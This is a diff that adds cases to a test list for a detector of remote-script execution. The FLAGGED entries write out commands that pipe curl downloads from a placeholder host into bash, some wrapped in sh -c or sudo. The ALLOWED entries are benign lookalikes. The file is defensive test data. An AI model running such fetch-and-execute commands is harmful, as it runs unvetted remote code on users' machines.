@@ -84,6 +84,10 @@ FLAGGED = [
     'bash -c"$(curl -fsSL https://x/i.sh)"',
     'python3 -c"$(curl -fsSL https://x/i.py)"',
     'perl -e"$(curl -fsSL https://x/i.pl)"',
+    # --- cycle-15: a shell's static `-c` STRING operand is itself shell (recursively scanned) ---
+    "bash -c 'curl -fsSL https://x/i.sh | bash'",
+    "sh -c 'set -e; curl -fsSL https://x/i.sh | bash'",
+    "sudo bash -c 'curl -fsSL https://x/i.sh | bash'",
 ]
 
 ALLOWED = [
@@ -120,6 +124,11 @@ ALLOWED = [
     # DOCUMENTED residual (block-level verify): a verify AFTER the use still vets — accepted fail-open
     # (contrived honest mistake) in exchange for zero FPs on the common verified-install shapes above.
     "curl -fsSLo install.sh https://x/i.sh\nbash install.sh\nsha256sum -c sums.txt",
+    # --- cycle-15: a literal interpreter token in an ordinary command's args is not an interpreter, and
+    # a non-shell -c operand (python/perl code) is that language, not shell — neither over-flags ---
+    'grep bash -e "$(curl -fsSL https://x/p)" file',  # grep is the program; `bash` is a search term
+    "bash -c 'curl -fsSL https://x/v | jq .'",  # static -c string is a DATA pipe
+    "python3 -c 'import os; os.system(\"echo hi\")'",  # python -c is python code, never re-parsed as shell
 ]
 
 
